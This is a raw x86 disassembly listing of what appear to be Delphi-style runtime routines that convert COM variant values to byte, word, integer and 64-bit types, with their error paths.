call [ ebx + 0x18 ]
jmp r-xdata
sub_40fa54
push ebx
push esi
mov ebx edx
mov esi eax
mov ax [ ebx ]
movzx edx ax
cmp ecx edx
jne r-xdata
cmp ax 0x400c
jne r-xdata
mov edx ebx
mov eax esi
call sub_40f510
pop esi
pop ebx
retn
mov edx ecx
cmp edx 0x14
ja r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40fa54
jmp r-xdata
mov edx ecx
sub edx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40fa99 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_40f884
jmp r-xdata
dec edx
je r-xdata
cmp [ ebx ] 0x1
jne r-xdata
mov eax esi
call sub_40ef50
jmp r-xdata
mov eax ebx
call sub_4103c0
mov edx eax
mov eax esi
call sub_4136cc
jmp r-xdata
mov eax ebx
call sub_40fe18
mov edx eax
mov eax esi
call sub_41362c
jmp r-xdata
mov eax ebx
call sub_411784
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax esi
call sub_413718
jmp r-xdata
mov eax ebx
call sub_4113ec
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_41373c
jmp r-xdata
mov eax ebx
call sub_4120c4
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax esi
call sub_413768
jmp r-xdata
mov eax ebx
call sub_411b5c
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_413794
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f838
jmp r-xdata
mov eax ebx
call sub_410ed8
mov edx eax
mov eax esi
call sub_4137c0
jmp r-xdata
mov eax ebx
call sub_410268
mov edx eax
mov eax esi
call sub_4136ac
jmp r-xdata
mov eax ebx
call sub_410318
mov edx eax
mov eax esi
call sub_41364c
jmp r-xdata
mov eax ebx
call sub_4104b8
mov edx eax
mov eax esi
call sub_41366c
jmp r-xdata
mov eax ebx
call sub_410590
mov edx eax
mov eax esi
call sub_41368c
jmp r-xdata
mov eax ebx
call sub_4108dc
push edx
push eax
mov eax esi
call sub_4136ec
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f8d0
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f91c
jmp r-xdata
mov dx 0x101
call sub_40ea04
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_40f1e8
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_40f9e8
xor edx edx
mov ax 0x1
call sub_40ea04
jmp r-xdata
sub_40fc80
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40fd23
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_412ea0
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_404224
mov eax [ ebp - 0xc ]
lea edx [ ebp - 0x4 ]
call sub_408444
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fd2a
lea eax [ ebp - 0xc ]
call sub_403f9c
lea eax [ ebp - 0x8 ]
call sub_4046a8
retn
mov eax ebx
call sub_410ed8
and eax 0x7f
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov dx [ ebx ]
mov cx 0x3
call sub_40ee44
jmp r-xdata
sub_40fd34
push ebx
add esp 0xfffffff0
mov ebx eax
push esp
call VariantInit
push 0x3
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x3
call sub_40ee44
mov eax [ esp + 0x8 ]
add esp 0x10
pop ebx
retn
sub_40fd70
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx eax
lea eax [ ebp - 0x14 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40fdc4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x14 ]
call sub_40f510
lea eax [ ebp - 0x14 ]
call [ rw-data ]
lea eax [ ebp - 0x14 ]
call sub_40fe18
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fdcb
lea eax [ ebp - 0x14 ]
call sub_40f1e8
retn
sub_40fdd4
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_415874
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x3
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
sub_40fe18
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_410239
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40fe4b ]
mov eax [ ebp - 0x4 ]
call sub_40fc80
mov [ ebp - 0x8 ] eax
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402a14
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402a14
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fdiv [ r-xdata ]
call sub_402a14
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402a14
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_40fc80
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ eax + 0x8 ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_40fe18
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40fd34
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40fd70
mov [ ebp - 0x8 ] eax
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov dx 0x3
mov ax 0x1
call sub_40ea04
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403184
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403184
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403184
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403184
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403184
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403184
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x4 ]
test ah 0x40
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40fdd4
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_40fd34
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_40fd34
mov [ ebp - 0x8 ] eax
jmp r-xdata
jmp [ eax * 4 + jump_table_41006f ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402a14
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402a14
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
call sub_402a14
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402a14
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_40fc80
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_40fe18
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403184
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403184
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403184
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403184
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403184
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_403184
sub_410268
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
sub ax 0x1
jb r-xdata
xor ebx ebx
jmp r-xdata
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0xa
je r-xdata
xor ebx ebx
jmp r-xdata
mov dx 0x10
mov ax 0x1
call sub_40ea04
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
sub ax 0x5
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
jmp r-xdata
xor eax eax
push ebp
push sub_4102f4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40fe18
mov ebx eax
add ebx 0x80
cmp ebx 0xff
jbe r-xdata
add ebx 0xffffff80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_403184
sub_410318
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
sub ax 0x1
jb r-xdata
xor ebx ebx
jmp r-xdata
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0xa
je r-xdata
xor ebx ebx
jmp r-xdata
mov dx 0x11
mov ax 0x1
call sub_40ea04
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
sub ax 0x6
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
jmp r-xdata
xor eax eax
push ebp
push sub_41039b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40fe18
mov ebx eax
cmp ebx 0xff
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_403184
sub_4103c0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x11
ja r-xdata
xor eax eax
push ebp
push sub_410494
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40fe18
mov ebx eax
add ebx 0x8000
cmp ebx 0xffff
jbe r-xdata
mov al [ eax + lookup_table_4103e6 ]
jmp [ eax * 4 + jump_table_4103f8 ]
add ebx 0xffff8000
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_403184
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movsx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x2
mov ax 0x1
call sub_40ea04
sub_4104b8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x12
ja r-xdata
xor eax eax
push ebp
push sub_41056d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40fe18
mov ebx eax
cmp ebx 0xffff
jbe r-xdata
mov al [ eax + lookup_table_4104da ]
jmp [ eax * 4 + jump_table_4104ed ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_403184
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x12
mov ax 0x1
call sub_40ea04
sub_410590
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x13
ja r-xdata
xor eax eax
push ebp
push sub_410655
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4108dc
test edx edx
je r-xdata
mov al [ eax + lookup_table_4105b6 ]
jmp [ eax * 4 + jump_table_4105ca ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_403184
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
movsx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x13
mov ax 0x1
call sub_40ea04
sub_410678
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x3
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
push 0x5
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
cmp eax 0x80020005
jne r-xdata
fld [ esp + 0x10 ]
call sub_402a14
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x18
pop ebx
retn
mov dx [ ebx ]
mov cx 0x14
call sub_40ee44
mov [ esp ] 0x0
mov [ esp + 0x4 ] 0x0
mov eax ebx
call sub_410ed8
and eax 0x7f
xor edx edx
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
sub_410724
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_410812
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412ea0
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_404224
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x8 ]
call sub_408464
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410819
lea eax [ ebp - 0x1c ]
call sub_403f9c
lea eax [ ebp - 0xc ]
call sub_4046a8
retn
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
cmp eax 0x80020005
jne r-xdata
fld [ ebp - 0x18 ]
call sub_402a14
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
mov dx [ ebx ]
mov cx 0x14
call sub_40ee44
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov eax ebx
call sub_410ed8
and eax 0x7f
xor edx edx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
sub_410824
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41087b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f510
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_4108dc
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410882
lea eax [ ebp - 0x18 ]
call sub_40f1e8
retn
sub_410890
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_415874
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x14
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_4108dc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_410ce8
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_41090f ]
mov eax [ ebp - 0x4 ]
call sub_410724
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
dec dx
je r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402a14
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402a14
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fdiv [ r-xdata ]
call sub_402a14
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402a14
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_410724
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x8 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0xc ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_4108dc
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_410678
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_410824
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov dx 0x14
mov ax 0x1
call sub_40ea04
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
test ah 0x40
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_410890
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_410678
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x4 ]
call sub_410678
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_410b33 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402a14
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402a14
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
call sub_402a14
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402a14
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_410724
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_4108dc
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
sub_410d20
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_410dd7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_412ea0
lea eax [ ebp - 0xa ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_404224
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x1 ]
call sub_408550
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410dde
lea eax [ ebp - 0x10 ]
call sub_403f9c
lea eax [ ebp - 0x8 ]
call sub_4046a8
retn
mov dx [ ebx ]
mov cx 0xb
mov eax 0x80020005
call sub_40ee44
jmp r-xdata
mov dx [ ebx ]
mov cx 0xb
call sub_40ee44
cmp [ ebp - 0xa ] 0x1
sbb eax eax
inc eax
mov [ ebp - 0x1 ] al
jmp r-xdata
